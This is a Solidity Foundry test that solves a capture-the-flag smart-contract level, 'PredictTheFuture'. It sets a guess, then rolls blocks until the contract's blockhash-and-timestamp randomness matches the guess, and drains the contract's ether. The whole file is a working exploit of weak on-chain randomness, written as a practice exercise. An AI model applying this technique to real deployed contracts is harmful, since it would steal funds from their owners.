// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/06_PredictTheFuture/PredictTheFuture.sol";

// forge test --match-contract PredictTheFutureTest -vvvv
contract PredictTheFutureTest is BaseTest {
    PredictTheFuture instance;

    function setUp() public override {
        super.setUp();
        instance = new PredictTheFuture{value: 0.01 ether}();

        vm.roll(143242);
    }

    function testExploitLevel() public {
        uint8 myGuess = 7;
        instance.setGuess{value: 0.01 ether}(myGuess);

        uint256 nextBlockNumber = block.number + 1;

        while (true) {
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 15);

            if (block.number <= nextBlockNumber) {
                continue;
            }

            bytes32 prevBlockHash = blockhash(block.number - 1);

            uint256 answer = uint256(keccak256(abi.encodePacked(prevBlockHash, block.timestamp))) % 10;

            if (answer == myGuess) {
                instance.solution();
                break;
            }
        }

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
